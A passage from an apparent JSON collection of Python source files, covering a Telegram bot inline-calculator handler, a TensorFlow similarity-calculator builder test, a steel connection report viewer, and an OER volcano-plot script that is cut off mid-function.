\"C\":\n        udB.delete(\"calc\")\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                await e.answer(\"Error\", cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "550": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "551": "from connection.materialstrength import MaterialStrength\n\n\nclass Viewer:\n    def __init__(self, text_edit, conn_type):\n        self.text_edit = text_edit\n        self.conn_type = conn_type\n\n    def displayProject(self, project_desc):\n        # self.text_edit.append('PROJECT DESCRIPTION:')\n        self.text_edit.append('Job No. : ' + project_desc['job_no'] + '\\t\\tProject Symbol : ' +\n                              project_desc['project_symbol'])\n        # self.text_edit.append('Project Symbol: ' + project_desc['project_symbol'])\n        self.text_edit.append('Project Title\\t\\t: ' + project_desc['project_title'])\n        self.text_edit.append('Client/Owner\\t\\t: ' + project_desc['client'])\n        self.text_edit.append('Structure Tag\\t\\t: ' + project_desc['item'])\n        self.text_edit.append('')\n\n    def displayMaterial(self, material):\n        self.text_edit.append('MATERIAL SPECIFICATION:')\n        self.text_edit.append('Structural Steel Section and Plates\\t: ' + material[0])\n        self.text_edit.append('High Strength Bolt (HSB)\\t\\t: ' + material[1])\n        self.text_edit.append('Weld Metal Filler Classification Strength\\t: ' + material[2])\n        self.text_edit.append('')\n\n    def displayConnGeometry(self, geometry):\n        self.text_edit.append('CONNECTION GEOMETRY:')\n        self.text_edit.append('Connection Type \\t\\t: ' + self.conn_type)\n        self.text_edit.append('Beam/Girder size\\t\\t: ' + geometry['size'])\n        self.text_edit.append('Bolt diameter, in\\t\\t: ' + geometry['dia'])\n        self.text_edit.append('No. of bolts\\t\\t\\t: ' + geometry['nos'])\n        self.text_edit.append('No. of column of bolts\\t\\t: ' + geometry['col'])\n        self.text_edit.append('Fillet weld size, in\\t\\t: ' + geometry['weld'])\n        self.text_edit.append('Vertical edge distance, in\\t\\t: ' + geometry['ev'])\n        self.text_edit.append('Horizontal edge distance, in\\t\\t: ' + geometry['eh'])\n        self.text_edit.append('Gusset Plate thickness, in\\t\\t: ' + geometry['tg'])\n        self.text_edit.append('Gusset Plate height, in\\t\\t: ' + geometry['H'])\n        self.text_edit.append('Dist. from TOB to G.Plate,in\\t\\t: ' + geometry['c'])\n        self.text_edit.append('Supporting member,\\t\\t: ' + geometry['size2'] + ' (' + geometry['support'] + ')')\n        self.text_edit.append('')\n\n    def displayLoadings(self, loadings):\n        self.text_edit.append('LOADINGS:')\n        self.text_edit.append('No.\\tMember\\t' + 'L/C\\t' + 'Node\\t' + 'Fx(kip)\\t' + 'Fy(kip)\\t' + 'Fz(kip)\\t' +\n                              'My(kip-in)\\t' + 'Mz(kip-in)')\n        index = 0\n        for load in loadings:\n            self.text_edit.append(str(index + 1) + '\\t' + str(load[0]) + '\\t' + str(load[1]) + '\\t' + str(load[2]) + '\\t' +\n                                  str(load[3]) + '\\t' + str(load[4]) + '\\t' + str(load[5]) + '\\t' + str(load[6]) +\n                                  '\\t' + str(load[7]))\n            index += 1\n        self.text_edit.append('')\n\n    def displayMaterialStrength(self, material):\n        ms = MaterialStrength(material[0], material[1], material[2])\n        self.text_edit.append('MATERIAL STRENGTH:')\n        self.text_edit.append('Structural steel yield strength, ksi\\t Fy = ' + str(ms.Fy))\n        self.text_edit.append('Steel min. tensile strength, ksi\\t Fup = ' + str(ms.Fup))\n        self.text_edit.append('HSB min. tensile strength, ksi\\t Fub = ' + str(ms.Fub))\n        self.text_edit.append('HSB nominal shear stress, ksi\\t Fnv = ' + str(ms.Fnv))\n        self.text_edit.append('HSB nominal tensile stress, ksi\\t Fnt = ' + str(ms.Fnt))\n        self.text_edit.append('Weld metal nominal stress, ksi\\t Fnw = ' + str(ms.Fnw))\n        self.text_edit.append('')\n\n    def displayCalculationResult(self, design_result, calc_result):\n        self.text_edit.append('CALCULATION RESULTS:')\n        self.text_edit.append('Bolt group modulus, in\\t\\t Zbx = ' + str(design_result.bolt_modulus[0]))\n        self.text_edit.append('Bolt group modulus, in\\t\\t Zby = ' + str(design_result.bolt_modulus[1]))\n        self.text_edit.append('Shear force eccentricity, in\\t\\t e =' + str(design_result.ecc))\n        self.text_edit.append('')\n        self.text_edit.append('Mode \\t\\t\\t\\tLoad \\tActual \\tProvided \\tU/R')\n        self.text_edit.append('Bolt shear strength, kip\\t\\t\\t' + str(calc_result[0][0] + 1) + '\\t' + str(calc_result[0][1]) +\n                              '\\t' + str(calc_result[0][2]) + '\\t' + str(calc_result[0][3]))\n        self.text_edit.append('Bearing strength on bolt hole, kip\\t\\t' + str(calc_result[1][0] +1) + '\\t' +\n                              str(calc_result[1][1]) + '\\t' + str(calc_result[1][2]) + '\\t' + str(calc_result[1][3]))\n        self.text_edit.append('Plate block shear strength, kip\\t\\t' + str(calc_result[2][0] +1) + '\\t' +\n                              str(calc_result[2][1]) + '\\t' + str(calc_result[2][2]) + '\\t' + str(calc_result[2][3]))\n        self.text_edit.append('Plate shear yielding, kip\\t\\t\\t' + str(calc_result[3][0] + 1) + '\\t' +\n                              str(calc_result[3][1]) + '\\t' + str(calc_result[3][2]) + '\\t' + str(calc_result[3][3]))\n        self.text_edit.append('Plate shear rupture, kip\\t\\t\\t' + str(calc_result[4][0] + 1) + '\\t' +\n                              str(calc_result[4][1]) + '\\t' + str(calc_result[4][2]) + '\\t' + str(calc_result[4][3]))\n        self.text_edit.append('Plate tensile yielding, kip\\t\\t\\t' + str(calc_result[5][0] + 1) + '\\t' +\n                              str(calc_result[5][1]) + '\\t' + str(calc_result[5][2]) + '\\t' + str(calc_result[5][3]))\n        self.text_edit.append('Plate tensile rupture, kip\\t\\t\\t' + str(calc_result[6][0] + 1) + '\\t' +\n                              str(calc_result[6][1]) + '\\t' + str(calc_result[6][2]) + '\\t' + str(calc_result[6][3]))\n        self.text_edit.append('Plate in-plane bending, kip-in \\t\\t' + str(calc_result[7][0] + 1) + '\\t' +\n                              str(calc_result[7][1]) + '\\t' + str(calc_result[7][2]) + '\\t' + str(calc_result[7][3]))\n        self.text_edit.append('Plate out-of-plane bending, kip-in\\t\\t' + str(calc_result[8][0] + 1) + '\\t' +\n                              str(calc_result[8][1]) + '\\t' + str(calc_result[8][2]) + '\\t' + str(calc_result[8][3]))\n        self.text_edit.append('Weld shear strength, kip/in\\t\\t\\t' + str(calc_result[9][0] + 1) + '\\t' +\n                              str(calc_result[9][1]) + '\\t' + str(calc_result[9][2]) + '\\t' + str(calc_result[9][3]))\n        self.text_edit.append('')\n        if self.conn_type == 'ShearCope':\n            self.text_edit.append('Web block shear strength, kip\\t\\t' + str(calc_result[10][0] + 1) + '\\t' +\n                                  str(calc_result[10][1]) + '\\t' + str(calc_result[10][2]) + '\\t' + str(\n                calc_result[2][3]))\n            self.text_edit.append('Web shear yielding, kip\\t\\t\\t' + str(calc_result[11][0] + 1) + '\\t' +\n                                  str(calc_result[11][1]) + '\\t' + str(calc_result[11][2]) + '\\t' + str(\n                calc_result[3][3]))\n            self.text_edit.append('Web shear rupture, kip\\t\\t\\t' + str(calc_result[12][0] + 1) + '\\t' +\n                                  str(calc_result[12][1]) + '\\t' + str(calc_result[12][2]) + '\\t' + str(\n                calc_result[4][3]))\n            self.text_edit.append('Web tensile yielding, kip\\t\\t\\t' + str(calc_result[13][0] + 1) + '\\t' +\n                                  str(calc_result[13][1]) + '\\t' + str(calc_result[13][2]) + '\\t' + str(\n                calc_result[5][3]))\n            self.text_edit.append('Web tensile rupture, kip\\t\\t\\t' + str(calc_result[14][0] + 1) + '\\t' +\n                                  str(calc_result[14][1]) + '\\t' + str(calc_result[14][2]) + '\\t' + str(\n                calc_result[6][3]))\n            self.text_edit.append('Web in-plane bending, kip-in \\t\\t' + str(calc_result[15][0] + 1) + '\\t' +\n                                  str(calc_result[15][1]) + '\\t' + str(calc_result[15][2]) + '\\t' + str(\n                calc_result[7][3]))\n            self.text_edit.append('Web out-of-plane bending, kip-in\\t\\t' + str(calc_result[16][0] + 1) + '\\t' +\n                                  str(calc_result[16][1]) + '\\t' + str(calc_result[16][2]) + '\\t' + str(\n                calc_result[16][3]))\n            self.text_edit.append('')\n", "552": "#/usr/bin/env python\n\n\"\"\"Plot 2D, 3D volcano, and Scaling for OER systems.\n\nIllustrate simple contour plotting, contours on an image with\na colorbar for the contours, and labelled contours.\n\nSee also contour_image.py.\n\"\"\"\n\n# | - Import Modules\nimport os\nimport matplotlib\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nfrom pylab import polyfit\nfrom pylab import poly1d\nfrom pylab import plot\n\n# | - __old__\n# from pylab import *\n# from matplotlib.ticker import *\n# from scipy import *\n# import matplotlib.cm as cm\n# import matplotlib.mlab as mlab\n# from math import pow\n# import matplotlib.pyplot as plt\n# import numpy as np\n# from matplotlib.path import Path\n# from matplotlib.patches import PathPatch\n# import subprocess\n#Import plot_settings as ps\n# from matplotlib import rc\n#__|\n\n#__|\n\n# | - Data *********************************************************************\ncalc_systems=[]\n#energies are dGs on dEs!\n#to input dEs\n\n# | - User Data\ncalc_systems.append([0.821, 2.517, 4.017, 0.466, r'IrO3 (110) OH-covered','black',0.0,0.08,1.5,'8','green','s'])\n# calc_systems.append([ 0.33, r'IrO3 110 O-covered','black',0.0,0.08,1.5,'8','green','s'])\ncalc_systems.append([0.865, 2.425, 3.868, 0.33, r'IrO3 (110) O-covered','black',0.0,0.08,1.5,'8','green','^'])\ncalc_systems.append([1.375, 2.832, 4.334, 0.272, r'IrO3 (210) O-covered','black',0.0,0.08,1.5,'8','green','o'])\n\n# # Ti\n# calc_systems.append([-1.047  ,  -0.237  , 1.816   ,1.874,r'$TiO_{\\sf 2}H_{\\sf 2}-O$','black',0.0,0.08,1.5,'8','green','^'])\n# calc_systems.append([2.120  ,  4.195  , 4.864   ,0.890,r'$TiO_{\\sf 2}-O$','black',0.0,0.08,1.5,'8','green','o'])\n# calc_systems.append([-0.575  ,  2.032  , 2.534   ,1.377,r'$TiO_{\\sf 2}H_{\\sf 0.25}-OH$','black',0.0,0.08,1.5,'8','green','o'])\n#\n# # V\n# calc_systems.append([-0.342  ,   0.384  , 2.648   ,1.042,r'$V(OH)_{\\sf 2}-O$','black',0.0,0.08,1.5,'8','black','^'])\n# calc_systems.append([0.486  ,   1.629  , 3.771   ,0.912,r'$VOOH-O$','black',0.0,0.08,1.5,'8','black','s'])\n# calc_systems.append([0.630  ,   1.935  , 3.925   ,0.760,r'$VO_{\\sf 2}-O$','black',0.0,0.08,1.5,'8','black','o'])\n#\n# # Cr\n# calc_systems.append([1.078  ,   2.586  ,   4.121 , 0.305, r'$CrOOH-O$', 'black', 0.0,0.08,1.5,'8','orange','s'])  #O cover right\n# #calc_systems.append([1.431  ,   3.517  , 2.840   ,0.855,r'$CrO_{\\sf 2}H_{\\sf 2}-O$','black',0.0,0.08,1.5,'8','orange','^'])\n# calc_systems.append([1.615  ,   3.243  , 4.815   ,0.399,r'$CrO_{\\sf 2}-O$','black',0.0,0.08,1.5,'8','orange','o'])\n# #calc_systems.append([1.413  ,   2.858  , 4.252   ,0.215,r'$CrO_{\\sf 2}H_{\\sf 0.25}-O$','black',0.0,0.08,1.5,'8','orange','o'])\n#\n# # Mn\n# calc_systems.append([-0.214  ,   1.049  , 3.044   ,0.765,r'$MnOOH-bridge$','red',0.0,0.08,1.5,'8','yellow','s'])\n# #calc_systems.append([0.779  ,   2.957  , 4.787   ,0.948,r'$MnO_{\\sf 2}H_{\\sf 2}-O$','black',0.0,0.08,1.5,'8','yellow','^'])\n# calc_systems.append([1.576  ,   3.675  , 4.375   ,0.869,r'$MnO_{\\sf 2}-O$','black',0.0,0.08,1.5,'8','yellow','o'])\n#\n# # Fe\n# calc_systems.append([0.661  ,   3.258 ,    3.737 , 1.367, r'$Fe(OH)_{\\sf 2}-O$', 'black', 0.0,0.08,1.5,'8','purple','^'])\n# calc_systems.append([2.148  ,   4.269 ,    4.607 , 0.918, r'$FeOOH-O$', 'black', 0.0,0.08,1.5,'8','purple','s'])\n# calc_systems.append([1.912  ,   4.184  , 4.721   , 1.041  ,r'$FeO_{\\sf 2}-O$','black',0.0,0.08,1.5,'8','purple','o'])\n#\n# # Co\n# calc_systems.append([0.622,   2.174,    3.832,    0.429 ,r'$Co(OH)_{\\sf 2}-O$','black',0.0,0.08,1.5,'8','blue','^'])\n# calc_systems.append([1.143  ,   2.865  ,   4.118 , 0.493,r'$CoOOH-OH$','black',0.0,0.08,1.5,'8','blue','s'])\n# calc_systems.append([1.640  ,   3.225  , 4.451   ,0.410  ,r'$CoO_{\\sf 2}-OH$','black',0.0,0.08,1.5,'8','blue','o'])\n# #calc_systems.append([1.336  ,   1.771  , 3.982   ,0.981  ,r'$CoO_{\\sf 2}H_{\\sf 0.25}-O$','black',0.0,0.08,1.5,'8','blue','o'])\n#\n# # Ni\n# calc_systems.append([1.413  , 3.853  , 4.653   ,1.210  ,r'$Ni(OH)_{\\sf 2}-O$','black',0.0,0.08,1.5,'8','pink','^'])\n# calc_systems.append([0.575  , 2.183  , 3.742   ,0.378  ,r'$NiOOH-bridge$','red',0.0,0.08,1.5,'8','pink','s'])\n# calc_systems.append([1.248  , 3.413  , 4.378   ,0.936  ,r'$NiO_{\\sf 2}-OH$','black',0.0,0.08,1.5,'8','pink','o'])\n#__|\n\n#__|\n\ndef create_OER_plots(\n    data,\n    plots_folder=\"OER_plots\"\n    ):\n    \"\"\"I'm just wrapping Michals whole script in a method.\n\n    Args:\n        data:\n        plots_folder:\n    \"\"\"\n    # | - create_OER_plots\n    calc_systems = data\n\n    # | - Styling and Setup\n    # settings size and font for revtex stylesheet\n\n    fig_width_pt = 1.8 * 246.0  # Get this from LaTeX using \\showthe\\columnwidth\n    #fig_width_pt *= 300./72 # convert to 300 dpi\n    inches_per_pt = 1.0 / 72.27               # Convert pt to inches\n    #inches_per_pt = 1.0/300               # Convert pt to inches\n    golden_mean = (np.sqrt(5) - 1.0) / 2.0         # Aesthetic ratio\n    fig_width = fig_width_pt * inches_per_pt  # width in inches\n    fig_height = fig_width * golden_mean       # height in inches\n    fig_size = [fig_width, fig_height]\n    fig = plt.figure(figsize=fig_size, dpi=300)\n\n    font_size = 9\n    tick_font_size = 8\n    xlabel_pad = 8\n    ylabel_pad = 18\n    matplotlib.rcParams['ps.usedistiller'] = 'xpdf'\n\n    matplotlib.rcParams['font.size'] = 10\n    #matplotlib.rcParams['axes.labelsize'] = 2*font_size\n    matplotlib.rcParams['axes.labelsize'] = font_size\n    matplotlib.rcParams['legend.fontsize'] = font_size\n    matplotlib.rcParams['xtick.labelsize'] = tick_font_size\n    matplotlib.rcParams['ytick.labelsize'] = tick_font_size\n\n    font_default = 'helvetica'\n    #font_default='cmss'\n\n    def setfont(font=font_default, unicode=True):\n        \"\"\"Set font.\n\n        Set Matplotlibs rcParams to use LaTeX for font rendering.\n        Revert all changes by calling rcdefault() from matplotlib.\n\n        Parameters:\n        -----------\n        font: string\n            \"Helvetica\"\n            \"Times\"\n            \"Computer Modern\"\n\n        usetex: Boolean\n            Use unicode. Default: False.\n\n        \"\"\"\n        # | - setfont\n        # Use TeX for all figure text!\n        plt.rc('text', usetex=True)\n\n        font = font.lower().replace(\" \", \"\")\n        if font == 'times':\n            # Times\n            font = {'family': 'serif', 'serif': ['Times']}\n            preamble = r\"\"\"\n                          \\usepackage{color}\n                          \\usepackage{mathptmx}\n                       \"\"\"\n        elif font == 'helvetica':\n            # Helvetica\n            # set serif, too. Otherwise setting to times and then\n            # Helvetica causes an error.\n            font = {'family': 'sans-serif', 'sans-serif': ['Helvetica'],\n                    'serif': ['cm10']}\n            preamble = r\"\"\"\n                          \\usepackage{color}\n                          \\usepackage[tx]{sfmath}\n                          \\usepackage{helvet}\n                          \\usepackage{sansmath}\n                       \"\"\"\n        else:\n            # Computer modern serif\n            font = {'family': 'serif', 'serif': ['cm10']}\n            # preamble = r\"\"\"\n            preamble = r\"\"\"\n                        \\usepackage{color}\n                        \"\"\"\n\n        if font == 'cmss':\n            # Computer modern sans serif\n            font = {'family': 'sans-serif', 'serif': ['cmss']}\n            preamble = r\"\"\"\n                          \\usepackage{color}\n                          \\usepackage[tx]{sfmath}\n                       \"\"\"\n\n        if unicode:\n            # Unicode for Tex\n            #preamble =  r\"\"\"\\usepackage[utf8]{inputenc}\"\"\" + preamble\n            # inputenc should be set automatically\n            plt.rcParams['text.latex.unicode'] = True\n\n        # print font, preamble\n        plt.rc('font', **font)\n        plt.rcParams['text.latex.preamble'] = preamble\n        #__|\n\n    setfont(\n        font_default,\n        # unicode=True,\n        unicode=False,\n        )\n\n    matplotlib.rcParams['lines.linewidth'] = 1.\n\n    #matplotlib.rcParams['ytick.direction'] = 'out'\n    #matplotlib.rcParams['xtick.direction'] = 'out'\n\n    ax = fig.add_axes([0.2, 0.2, 0.6, 0.6])\n\n    zoom = 0.5\n    d1 = 3 * zoom\n    d2 = 4 * zoom\n    xcenter = 1.5  # 0.65\n    #ycenter=1.23#2.4\n    ycenter = 0.8  # 2.4\n\n    x1 = xcenter - d1  # -0.6\n    x2 = xcenter + d1  # 2.2\n    y1 = ycenter - d2  # 1#0.5\n    y2 = ycenter + d2  # 5\n    ax.axis([x1, x2, y1, y2])\n    ax.set_xlabel(r'$\\Delta$G$_{\\sf O}$ - $\\Delta$G$_{\\sf OH}$ (eV)')\n    #ax.set_ylabel(r'$\\Delta$G$_{\\sf OOH}$ -$\\Delta$G$_{\\sf O}$ (eV)')\n    ax.set_ylabel(r'$\\Delta$G$_{\\sf OH}$')\n\n    delta = 0.025\n    x = np.arange(x1, x2 + delta, delta)\n    y = np.arange(y1, y2 + delta, delta)\n    X, Y = np.meshgrid(x, y)\n\n    #Z1 = mlab.bivariate_normal(X, Y, 1.0, 1.0, 0.0, 0.0)\n    #Z2 = mlab.bivariate_normal(X, Y, 1.5, 0.5, 1, 1)\n    # difference of Gaussians\n    #Z = 10.0 * (Z2 - Z1)\n    #__|\n\n    # | - Methods\n    #fit=[0.84527288, 3.38026638]\n    def ooh_oh_scaling(doh):\n        \"\"\"ooh_oh_scaling equation.\"\"\"\n        # | - ooh_oh_scaling\n        #like ambars\n        #dooh=0.5*doh  + 3.0\t\t #O\n        #normal one\n\n        dooh = doh + 3.2\n        return(dooh)\n        #__|\n\n    def overpotential(doh, do):\n        \"\"\"Calculate overpotential.\n\n        Args:\n            doh:\n            do:\n        \"\"\"\n        # | - overpotential\n        dooh = ooh_oh_scaling(doh)\n        dg14 = [doh, do - doh, dooh - do, - dooh + 4.92]\n        m = max(dg14)\n        return(m - 1.23)\n        #return doh*do\n        #__|\n\n    def overpotential2(x, doh):\n        \"\"\"Calculate overpotential (version 2).\n\n        Args:\n            x:\n            doh:\n        \"\"\"\n        # | - overpotential2\n        dooh = ooh_oh_scaling(doh)\n        dg14 = [doh, x, -x + 2.46, -dooh + 4.92]\n        m = max(dg14)\n        return(m - 1.23)\n        #return doh*do\n        #__|\n\n    def overpotential3(x, doh):\n        \"\"\"Calculate overpotential (version 3).\n\n        Args:\n            x:\n            doh:\n        \"\"\"\n        # | - overpotential3\n        dooh = ooh_oh_scaling(doh)\n        dg14 = [doh, x, dooh - (x + doh), -dooh + 4.92]\n        m = max(dg14)\n        return(m - 1.23)\n\n        #return doh*do\n        #__|\n\n    def overpotential_label(doh, do):\n        \"\"\"Return overpotential label.\n\n        Args:\n            doh:\n            do:\n        \"\"\"\n        # | - overpotential_label\n        dooh = ooh_oh_scaling(doh)\n        dg14 = [doh, do - doh, dooh - do, -dooh + 4.92]\n        m = max(dg14)\n        for i in range(len(dg14)):\n            if(m == dg14[0]):\n                return(r'OH lim.')\n            if(m == dg14[1]):\n                return(r'OH-O lim.')\n            if(m == dg14[2]):\n                return(r'O-OOH lim.')\n            if(m == dg14[3]):\n                return( r'OOH-O$_{\\sf 2}$ lim.')\n        #return doh*do\n        #__|\n\n    #__|\n\n    #Z=overpotential(X,Y)\n\n    # | - OER_contour_plot *****************************************************\n    Z = []\n    for j in y:\n        tmp = []\n        for i in x:\n            tmp.append(overpotential3(i, j))\n        Z.append(tmp)\n\n\n    #print overpotential(0.8,2.4)\n\n    Z = np.array(Z)\n\n\n    #im = plt.imshow(Z, origin='lower',interpolation='bilinear',\n    #                cmap=cm.jet_r, extent=(x1,x2,y1,y2), vmin=0, vmax=2)\n\n    origin = 'lower'\n    levels = np.arange(0.0, 2, 0.1)\n    #levels = np.arange(0.2, 2, 0.1)\n    CS = plt.contourf(\n        X,\n        Y,\n        Z,\n        levels,\n        #20,\n        # [-1, -0.1, 0, 0.1],\n        #alpha=0.8,\n        #cmap=plt.cm.bone,\n        cmap=plt.cm.jet_r,\n        #extend='both',\n        extend='max',\n        origin=origin,\n        )\n\n    # Note that in the following, we explicitly pass in a subset of\n    # the contour levels used for the filled contours.  Alternatively,\n    # We could pass in additional levels to provide extra resolution,\n    # or leave out the levels kwarg to use all of the original levels.\n\n    CS2 = plt.contour(\n        CS,\n        levels=CS.levels,\n        colors='white',\n        linewidths=0.05,\n        alpha=0.3,\n        origin=origin,\n        # hold='on',\n        )\n\n    # | - __old__\n    #levels = np.arange(0, 2, 0.05)\n    #CS = plt.contourf(X,Y,Z, levels, cmap=cm.jet_r, origin='lower')\n    #CS = plt.contourf(X,Y,Z, levels, origin='lower')\n    #im = plt.imshow(Z, interpolation='bilinear', origin='lower',\n    #                cmap=cm.jet, extent=(x1,x2,y1,y2))\n    #levels2 = [2.0]\n    #CS2 = plt.contour(CS, levels2,\n    #                        colors = 'r',\n    #                        origin='lower',\n    #                        hold='on')\n    #CS = plt.contour(Z, levels,\n    #                 origin='lower',\n    #                 linewidths=0.5,\n    #                 extent=(x1,x2,y1,y2))\n    ##Thicken the zero contour.\n    #zc = CS.collections[6]\n    #plt.setp(zc, linewidth=2)\n    #__|\n\n    cbar = plt.colorbar(CS)\n    #cbar.ax.set_ylabel('Overpotential [V]')\n    #cbar.ax.set_ylabel(r'$\\eta_{\\sf calc.}$')\n    cbar.ax.set_ylabel(r'$\\eta_{\\sf OER}$')\n\n    # | - __old__\n    #cbar.add_lines(CS2)\n    #plt.clabel(CS, levels[1::2],  # label every second level\n    #           inline=1,\n    #           fmt='%1.1f',\n    #           fontsize='x-small')\n    #plt.title('Lines with colorbar')\n    # We can still add a colorbar for the image, too.\n    # This makes the original colorbar look a bit out of place,\n    # so let's improve its position.\n    #__|\n\n    ax.tick_params(axis='both', direction='out')\n    ax.get_xaxis().tick_bottom()   # remove unneeded ticks\n    ax.get_yaxis().tick_left()\n\n    # | - __old__\n    #plot(x,ooh_oh_scaling(x),'--',color='orange',lw=1,\n    # dashes=(3,1),label='$\\Delta$G$_{\\sf OOH}$=0.82G$_{\\sf OH}$+3.18 eV')\n    #ax.text(x1+0.02,y2-0.3,\n    # '$\\Delta$G$_{\\sf OOH}$=%.2fG$_{\\sf OH}$+%.2f eV' %(fit[0],fit[1]),\n    # color='orange',fontsize='x-small',zorder=10,horizontalalignment='left')\n    #ax.text(x1+0.02,y2-0.3,\n    # '$\\Delta$G$_{\\sf OOH}$=%.2fG$_{\\sf OH}$+%.2f eV' %(0.82,3.18),\n    # color='orange',fontsize='x-small',zorder=10,horizontalalignment='left')\n    #plt.show()\n    #__|\n\n    offset = [0.0, 0.08]\n\n    #foo=r': %f' % (calc_systems[i][3])\n    for i in range(len(calc_systems)):\n        # ax.plot(calc_systems[i][1]-calc_systems[i][0], calc_systems[i][0],\n        # 'or',color=calc_systems[i][5])\n\n        ax.plot(\n            calc_systems[i][1] - calc_systems[i][0],\n            calc_systems[i][0],\n            calc_systems[i][9],\n            mec=calc_systems[i][5],\n            mfc=calc_systems[i][10],\n            mew=0.8,\n            zorder=4,\n            marker=calc_systems[i][11],\n            label=calc_systems[i][4] + ' : %.2f V' % (calc_systems[i][3])\n            )\n\n    # | - __old__\n    # if i!=0 and 1:\n    # ax.text(calc_systems[i][1]-calc_systems[i][0]+calc_systems[i][6],\n    # calc_systems[i][0]+calc_systems[i][7],\n    # calc_systems[i][4]+'(%.2f)' %(calc_systems[i][3]),color='black',\n    # fontsize=6,horizontalalignment='center',rotation=0,zorder=1)\n    #  else:\n    #      ax.text(calc_systems[i][1]-calc_systems[i][0]+calc_systems[i][6],\n    # calc_systems[i][0]+calc_systems[i][7],\n    # calc_systems[i][4]+'(%.2f)' %(calc_systems[i][3]),\n    # color='white',fontsize=6,horizontalalignment='center',\n    # rotation=0,zorder=1)\n    #ax.text(calc_systems[i][0],calc_systems[i][1],'%i' %(i+1),\n    # color='black',fontsize=4,\n    #        horizontalalignment='center',\n    #        verticalalignment='center',\n    #        rotation=0,zorder=2)\n    #__|\n\n    corners = [\n        [1.3, 1.0],\n        [x1 + (x2 - x2) * 0.2, y1 + (y2 - y1) * 0.9],\n        [x1 + (x2 - x2) * 0.8, y1 + (y2 - y1) * 0.1],\n        [-2, 0],\n        ]\n\n    #for i in range(len(corners)):\n    #   ax.text(corners[i][0],corners[i][1], overpotential_label(corners[i][0],\n    # corners[i][1]), color='white',fontsize='x-small',\n    # horizontalalignment='center',rotation=0,zorder=3)\n\n    ax.legend(\n        bbox_to_anchor=(1.25, 1.05),\n        loc=2,\n        borderaxespad=1,\n        ncol=1,\n        fancybox=True,\n        shadow=True,\n        fontsize='x-small',\n        handlelength=2,\n        )\n\n    fig_path_i = os.path.join(\n        plots_folder,\n        \"OER_contour_plot_v13.pdf\",\n        )\n\n    if not os.path.exists(plots_folder):\n        os.makedirs(plots_folder)\n\n    fig.savefig(\n        fig_path_i,\n        bbox_inches=\"tight\",\n        )\n\n    # fig.savefig('OER_contour_plot_v13.pdf', bbox_inches='tight')\n    fig.clf()\n\n    #__| **********************************************************************\n\n    # | - OER_scaling **********************************************************\n\n    fig = plt.figure(figsize=fig_size, dpi=300)\n    ax = 